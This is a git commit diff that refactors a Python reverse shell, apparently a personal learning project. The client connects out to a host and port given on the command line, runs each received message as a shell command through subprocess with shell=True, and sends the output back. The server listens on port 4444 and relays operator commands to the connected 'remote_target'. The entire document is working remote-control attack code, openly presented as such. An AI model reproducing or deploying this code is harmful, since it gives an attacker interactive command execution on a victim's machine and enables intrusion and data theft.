e417adb9cdee3212abaeb41216e7c35c0047ce26
Benjamin PAUL <benjamin.olivier.paul@gmail.com>
2023-09-18 09:20:54 +0200

    cleaned code

--- sockclient.py
+++ sockclient.py
@@ -1,55 +1,58 @@
 import socket
 import subprocess
 import os
+import sys
 
-HOST_IP = "127.0.0.1"
-HOST_PORT = 4444
+HOST_IP = sys.argv[1]
+HOST_PORT = int(sys.argv[2])
+
+def inbound():
+    while True:
+        try:
+            message = sock.recv(1024).decode()
+            return message
+        except Exception:
+            sock.close()
+
+def outbound(message):
+    response = str(message).encode()
+    sock.send(response)
 
 def session_handler():
     print(f"[+] Connecting to {HOST_IP}...")
     sock.connect((HOST_IP, HOST_PORT))
     print(f"[+] Connected to {HOST_IP}.")
     while True:
-        try:
-            message = sock.recv(1024).decode()
-            print(f"[+] Instruction recieved --> {message}")
-            # case for handling exit command 
-            if message == "exit":
-                print("[-] The server has terminated this session.")
-                sock.close()
-                print("[-] Connection closed.")
-                break
-            # case for handling cd command
-            elif message.split(" ")[0] == "cd":
-                # cd without any arguments just prints the current directory
-                if len(message.split(" ")) == 1:
-                    cur_dir = os.getcwd()
-                    sock.send(cur_dir.encode())
-                else:
-                    directory = str(message.split(" ")[1])
-                    try: 
-                        os.chdir(directory)
-                        cur_dir = os.getcwd()
-                        print(f"[+] Changed directory to {cur_dir}.")
-                        sock.send(cur_dir.encode())
-                    except Exception:
-                        sock.send("Failed to change directory.".encode())
-            # case for handling commands without arguments
-            else:
-                # encoding="oem" is for Windows encoding, remove parameter otherwise
-                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="oem")
-                output = command.stdout.read() + command.stderr.read()
-                print(output.encode())
-                print(type(output))
-                sock.send(output.encode())
-        except KeyboardInterrupt:
-            print("Keyboard interrupt issued.")
+        message = inbound()
+        print(f"[+] Instruction recieved --> {message}")
+        # case for handling exit command 
+        if message == "exit":
+            print("[-] The server has terminated this session.")
             sock.close()
             print("[-] Connection closed.")
             break
-        except Exception:
-            sock.close()
-            break
+        # case for handling cd command
+        elif message.split(" ")[0] == "cd":
+            # cd without any arguments just prints the current directory
+            if len(message.split(" ")) == 1:
+                cur_dir = os.getcwd()
+                outbound(cur_dir)
+            else:
+                directory = str(message.split(" ")[1])
+                try: 
+                    os.chdir(directory)
+                    cur_dir = os.getcwd()
+                    print(f"[+] Changed directory to {cur_dir}.")
+                    outbound(cur_dir)
+                except Exception:
+                    outbound("Failed to change directory.")
+            # case for handling commands without arguments
+        else:
+            # encoding="oem" is for Windows encoding, remove parameter otherwise
+            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="oem")
+            output = command.stdout.read() + command.stderr.read()
+            outbound(output)
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-session_handler()
+if __name__ == "__main__":
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    session_handler()
--- sockserver.py
+++ sockserver.py
@@ -1,31 +1,34 @@
 import socket
+import sys
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 4444
 
-def listener_handler():
-    sock.bind((HOST_IP, HOST_PORT))
-    print("[+] Awaiting connection from client...")
-    sock.listen()
-    remote_target, remote_ip = sock.accept()
+def comm_in(remote_target) :
+    response = remote_target.recv(4096).decode(errors="replace")
+    return response
+
+def comm_out(remote_target, message):
+    remote_target.send(message.encode())
+
+def comm_handler(remote_target, remote_ip):
     print(f"[+] Connection recieved from {remote_ip[0]}.")
     print(f"    \___ port used on the client : {remote_ip[1]}")
     while True:
         try:
             message = input("Message_to_send#> ")
-            # special behaviour for exit command : send kill signal
             if message == "exit":
-                remote_target.send(message.encode())
+                comm_out(remote_target, message)
                 print("[-] sending kill signal...")
                 remote_target.close()
                 print("[-] Connection closed.")
-                break
-            remote_target.send(message.encode())
-            response = remote_target.recv(4096).decode(errors="replace")
+                break                
+            comm_out(remote_target, message)
+            response = comm_in(remote_target)
             print(response)
         except KeyboardInterrupt:
             print("Keyboard interrupt issued.")
-            remote_target.send("exit".encode())
+            comm_out(remote_target, "exit")
             print("[-] sending kill signal...")
             remote_target.close()
             print("[-] Connection closed.")
@@ -33,8 +36,17 @@ def listener_handler():
         except Exception:
             sock.close()
             break
-    
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener_handler()
+
+def listener_handler():
+    sock.bind((HOST_IP, HOST_PORT))
+    print("[+] Awaiting connection from client...")
+    sock.listen()
+    remote_target, remote_ip = sock.accept()
+    comm_handler(remote_target, remote_ip)
+
+
+if __name__ == "__main__":
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    listener_handler()
 
 
